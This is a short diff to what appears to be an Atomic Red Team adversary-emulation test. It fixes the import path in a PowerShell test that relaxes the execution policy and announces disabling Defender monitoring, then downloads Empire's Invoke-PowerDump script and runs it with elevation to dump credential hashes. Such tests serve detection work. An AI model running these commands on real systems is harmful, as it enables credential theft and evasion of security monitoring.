@@ -94,7 +94,7 @@ atomic_tests:
       Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green
       Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
       Invoke-Webrequest -Uri "https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1" -UseBasicParsing -OutFile "$Env:Temp\PowerDump.ps1"
-      Import-Module .\PowerDump.ps1
+      Import-Module "$Env:Temp\PowerDump.ps1"
       Invoke-PowerDump
     name: powershell
     elevation_required: true
